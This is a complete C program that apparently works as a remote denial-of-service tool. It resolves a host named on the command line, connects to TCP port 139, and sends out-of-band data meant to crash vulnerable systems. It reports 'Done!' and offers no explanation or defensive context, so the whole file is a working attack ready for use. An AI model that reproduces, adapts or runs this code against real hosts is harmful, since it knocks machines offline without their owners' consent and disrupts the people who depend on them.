#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

#define PORT 139

int main(int argc, char *argv[])
{
  int sd;
  char *str = "Crack";
  struct hostent *hp;
  struct sockaddr_in winaddr;

  if (argc != 2) {
    fprintf(stderr, "Usage: %s <target>\n", argv[0]);
    exit(-1);
  }

  hp = gethostbyname(argv[1]); 
  if (hp == NULL) {
    herror("gethostbyname() failed");
    exit(-1);
  }

  if ( (sd = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
    perror("socket() failed");
    exit(-1);
  }

  bzero(&winaddr, sizeof(winaddr));
  winaddr.sin_family = AF_INET;
  winaddr.sin_port = htons(PORT);
  winaddr.sin_addr = *((struct in_addr *)hp->h_addr);

  if (connect(sd, (struct sockaddr *)&winaddr, sizeof(winaddr)) < 0) {
    perror("connect() failed");
    exit(-1);
  }

  send(sd, str, strlen(str), MSG_OOB);
  printf("Done!\n");
  
  close(sd);

  return 0;
}
